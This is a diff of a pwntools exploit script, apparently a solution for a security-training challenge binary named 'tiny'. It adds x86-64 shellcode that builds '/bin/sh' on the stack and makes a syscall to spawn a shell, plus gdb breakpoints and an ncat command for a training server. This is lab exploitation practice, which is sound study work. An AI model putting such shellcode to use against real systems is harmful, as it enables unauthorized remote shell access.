@@ -1,4 +1,7 @@
 from pwn import *
+#xor esi, esi
+#xor edx, edx
+#syscall
 
 COMMANDS = """
 b cs_free
@@ -10,7 +13,7 @@ si
 si
 si
 """
-shellcode = b"\x31\xF6\x31\xD2"
+shellcode = b"\x6A\x2F\x6A\x62\x6A\x69\x6A\x6E\x6A\x2F\x6A\x73\x6A\x68\x6A\x00\x54\x5F\x31\xF6\x31\xD2\x0F\x05"
 #ncat --ssl back-to-shell.training.offensivedefensive.it 8080
 if args.GDB:
     p = gdb.debug("./tiny", gdbscript=COMMANDS)
